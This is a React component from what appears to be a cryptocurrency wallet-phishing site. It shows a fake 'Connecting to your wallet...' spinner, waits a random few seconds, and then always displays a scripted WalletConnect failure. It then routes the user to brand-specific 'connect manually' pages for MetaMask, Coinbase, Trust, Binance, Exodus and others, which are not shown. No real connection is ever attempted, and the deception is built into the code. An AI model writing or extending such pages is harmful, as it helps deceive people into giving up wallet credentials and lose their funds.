import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import SocialFooter from '../components/SocialFooter';
// Use loading.gif from public folder for spinner
const loadingGif = '/loading.gif';

const ConnectingPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { wallet } = location.state || {};
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Simulate connecting delay (random 4-5 seconds)
    const delay = Math.floor(Math.random() * 1000) + 4000;
    const timer = setTimeout(() => {
      setLoading(false);
  setError('Walletconnect failed to connect to your wallet.\nPlease continue to connect manually.');
    }, delay);
    return () => clearTimeout(timer);
  }, []);

  if (!wallet) {
    navigate('/wallets');
    return null;
  }

  return (
    <div>
      <Header />
      <main className="flex flex-col items-center justify-center min-h-[60vh]">
        <h1 className="flex justify-center mt-10 text-4xl font-semibold import__page">Connecting to your wallet...</h1>
        <div className="flex flex-col items-center mt-8">
          <div className="w-16 h-16 mb-4 flex items-center justify-center">
            <span className="inline-block w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></span>
          </div>
          {loading ? (
            <>
              <p className="text-lg text-gray-600 mt-4">Please wait while we connect to your wallet.</p>
            </>
          ) : error ? (
            <div className="text-center">
              <p className="text-red-600 text-xl font-semibold mb-2 whitespace-pre-line">{error}</p>
              <button
                className="mt-4 px-6 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition"
                onClick={() => {
                  if (wallet && wallet.name) {
                    let baseName = wallet.name.toLowerCase().replace(/[^a-z0-9]/g, '');
                    if (baseName.includes('binance')) baseName = 'binance';
                    if (baseName.includes('defi') || baseName.includes('crypto.com')) baseName = 'defi';
                    if (baseName.includes('mew')) baseName = 'mew';
                    if (baseName.includes('metamask')) baseName = 'metamask';
                    if (baseName.includes('coinbase')) baseName = 'coinbase';
                    if (baseName.includes('trust')) baseName = 'trust';
                    if (baseName.includes('atomic')) baseName = 'atomicwallet';
                    if (baseName.includes('walletconnect')) baseName = 'walletconnect';
                    if (baseName.includes('exodus')) baseName = 'exodus';
                    navigate(`/${baseName}`, { state: { wallet } });
                  }
                }}
              >
                Continue
              </button>
            </div>
          ) : (
            <button
              className="mt-4 px-6 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition"
              onClick={() => {
                if (wallet && wallet.name) {
                  let baseName = wallet.name.toLowerCase().replace(/[^a-z0-9]/g, '');
                  if (baseName.includes('binance')) baseName = 'binance';
                  if (baseName.includes('defi') || baseName.includes('crypto.com')) baseName = 'defi';
                  if (baseName.includes('mew')) baseName = 'mew';
                  if (baseName.includes('metamask')) baseName = 'metamask';
                  if (baseName.includes('coinbase')) baseName = 'coinbase';
                  if (baseName.includes('trust')) baseName = 'trust';
                  if (baseName.includes('exodus')) baseName = 'exodus';
                  navigate(`/${baseName}`, { state: { wallet } });
                }
              }}
            >
              Continue
            </button>
          )}
        </div>
      </main>
  <SocialFooter />
    </div>
  );
};

export default ConnectingPage;
